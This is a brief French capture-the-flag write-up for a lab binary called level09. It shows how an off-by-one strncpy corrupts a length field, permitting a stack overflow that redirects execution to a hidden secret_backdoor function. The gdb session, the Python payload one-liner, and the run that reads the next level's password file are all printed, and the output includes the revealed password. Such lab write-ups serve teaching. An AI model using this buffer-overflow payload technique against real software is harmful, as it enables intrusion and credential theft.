# Level09

```shell
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: Hello
>: Welcome, Hello
>: Msg @Unix-Dude
>>: World
>: Msg sent!
```

On voir qu'il y a une fonction `secret_backdoor` non appele, qui serai tres utile. Notre objectif est de modifier l'`rip` pour mettre l'adresse de cette fonction

```shell
$ gdb level09 -q
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0xaa8

(gdb) run
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aa8 in main ()
(gdb) x/x secret_backdoor
0x55555555488c <secret_backdoor>: 0xe5894855
```

On peut observer qu'il y a un `strncpy(s->username, username, 41)` dans la fonction `set_username` alors que `s->username[40]`. Il va alors reecrire sur `s->i` qui est utiliser dans `strncpy(s->msg, message, s->i)`.

- `LEN_STRUCT + RBP + 4(DEMI_RIP) = 204 <=> 0xcc`

on aura alors une chaine `python -c 'print("A"*40 + "\xcc\n" + "B"*200 + "\x55\x55\x48\x8c"[::-1])'`

On a plus qu'a essayer

```shell
$ (python -c 'print("A"*40 + "\xcc\n" + "B"*200 + "\x55\x55\x48\x8c"[::-1]) + "\ncat /home/users/end/.pass"') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```
